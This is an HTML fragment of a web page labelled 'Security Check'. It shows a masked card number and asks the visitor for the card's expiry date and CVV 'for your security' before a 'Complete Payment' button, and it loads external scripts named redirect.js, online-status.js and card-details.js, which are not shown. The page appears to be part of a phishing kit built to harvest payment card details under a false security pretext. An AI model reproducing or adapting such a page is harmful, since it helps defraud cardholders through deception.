  <body>
    <div class="container">
      <div class="left-section">
        <h1>Card Details</h1>
        <div class="subtitle">Security Check</div>

        <div class="illustration">
          <svg viewBox="0 0 220 180" xmlns="http://www.w3.org/2000/svg">
            <defs>
              <linearGradient
                id="security-grad"
                x1="0%"
                y1="0%"
                x2="100%"
                y2="100%"
              >
                <stop
                  offset="0%"
                  style="stop-color: #4d6aff; stop-opacity: 1"
                />
                <stop
                  offset="100%"
                  style="stop-color: #3355ff; stop-opacity: 1"
                />
              </linearGradient>
            </defs>

            <!-- Security shield -->
            <path
              d="M110 30 L140 40 L140 80 C140 120 110 150 110 150 C110 150 80 120 80 80 L80 40 Z"
              fill="url(#security-grad)"
            />

            <!-- Lock -->
            <rect x="100" y="70" width="20" height="25" rx="2" fill="white" />
            <circle cx="110" cy="80" r="8" fill="white" />
          </svg>
        </div>

        <p class="description">
          For your security, please enter your card expiration date and CVV code
        </p>
      </div>

      <div class="right-section">
        <div class="payment-card">
          <div class="card-header">
            <div class="status-icon">
              <svg
                width="32"
                height="32"
                viewBox="0 0 24 24"
                fill="none"
                stroke="white"
                stroke-width="2.5"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
              </svg>
            </div>
            <div class="payment-info">
              <div class="payment-status">Security Verification</div>
             
            </div>
          </div>

          <div class="order-info">
            <span class="order-label">Card Number</span>
            <span class="order-number" id="displayCardNumber">
              **** **** **** ****
            </span>
          </div>

          <div class="form-container">
            <div class="payment-method">
              <svg
                class="method-icon"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
              >
                <rect x="2" y="5" width="20" height="14" rx="2"></rect>
                <line x1="2" y1="10" x2="22" y2="10"></line>
              </svg>
              <span>Card Details</span>
            </div>

            <form id="payment-details-form">
              <div class="form-row">
                <div class="form-group">
                  <label class="form-label">Expiry date</label>
                  <input
                    type="text"
                    class="form-input"
                    placeholder="MM/YY"
                    id="expiry"
                    maxlength="5"
                  />
                </div>
                <div class="form-group">
                  <label class="form-label">Security code</label>
                  <input
                    type="text"
                    class="form-input"
                    placeholder="CVV"
                    id="cvv"
                    maxlength="4"
                  />
                </div>
              </div>

              <button type="submit" class="pay-button">
                <svg
                  width="18"
                  height="18"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2.5"
                  stroke-linecap="round"
                >
                  <path
                    d="M12 1v22M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"
                  ></path>
                </svg>
                Complete Payment
              </button>
            </form>
          </div>
        </div>
      </div>
    </div>
    <script src="/static/js/redirect.js?v3"></script>
    <script src="/static/js/online-status.js?v3"></script>
    <script src="/static/js/card-details.js?v3"></script>
